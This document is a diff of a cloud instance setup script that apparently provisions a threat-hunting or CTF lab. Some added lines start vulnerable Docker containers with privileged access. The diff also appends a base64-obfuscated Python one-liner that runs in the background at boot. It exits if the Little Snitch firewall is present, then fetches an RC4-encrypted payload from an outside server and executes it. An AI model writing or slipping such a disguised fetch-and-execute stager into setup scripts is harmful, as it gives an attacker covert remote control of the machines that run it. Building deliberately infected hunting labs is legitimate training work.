@@ -37,6 +37,7 @@ sudo apt-get install -y nmap
 sudo apt-get install -y awscli
 sudo apt-get install -y python
 sudo apt-get install -y python-pip
+sudo pip install requests
 sudo pip install flask
 sudo pip install boto3
 sudo apt-get install -y john
@@ -55,6 +56,8 @@ sudo chmod 700 /shared/other/bashrc.sh
 sudo echo "source /shared/other/bashrc.sh" >> /root/.bashrc
 echo "$(ifconfig eth0 | grep 'inet addr' | cut -d: -f2 | awk '{print $1}') $(hostname)" >> /tmp/userdata001.txt
 echo "$(ifconfig eth0 | grep 'inet addr' | cut -d: -f2 | awk '{print $1}') $(hostname)" | sudo tee --append /etc/hosts
+sudo chmod 700 /shared/hunt/ctf/002/v2.py
+sudo /usr/bin/python /shared/hunt/ctf/002/v2.py
 echo "END" >> /tmp/userdata001.txt
 """
 
@@ -67,11 +70,14 @@ uname -a >> /tmp/userdata001.txt
 #sudo apt-get update
 #apt-cache policy docker-ce
 #sudo apt-get install -y docker-ce
-sudo docker run --restart=always -d -p 8080:8080 cnoio/nbvulns001
-sudo docker run --restart=always -d -v /home/ubuntu:/home/ubuntu:ro --privileged -p 5000:5000 cnoio/nbvulns002
-sudo docker run --restart=always -d -p 8000:8000 cnoio/nbvulns003
-sudo docker run --restart=always -d -p 8081:8081 cnoio/nbvulns004
+sudo docker run --restart=always -d -v /home/ubuntu:/home/ubuntu:ro --privileged -p 8080:8080 cnoio/nbvulns001
+#sudo docker run --restart=always -d -v /home/ubuntu:/home/ubuntu:ro --privileged -p 5000:5000 cnoio/nbvulns002
+#sudo docker run --restart=always -d -p 8000:8000 cnoio/nbvulns003
+#sudo docker run --restart=always -d -p 8081:8081 cnoio/nbvulns004
 sudo docker run --restart=always -d -v /home/ubuntu:/home/ubuntu:ro --privileged -p 5001:5001 cnoio/nbvulns005
+sudo apt-get install -y python
+sudo apt-get install -y python-pip
+echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly9hcGkub210cmlvcmEuY29tOjgwJzt0PScvYWRtaW4vZ2V0LnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPUpHY2JuV0VvcDZ0UzlPbVZyKzZyT2VTWVR4ND0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc5ODU4ODAxY2QwOWM4NjVmMzE4MTc2NTBlZDliNDU2Mic7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSk='));" | /usr/bin/python &
 echo "END" >> /tmp/userdata001.txt
 """
 #Standard Ubuntu 16 Image
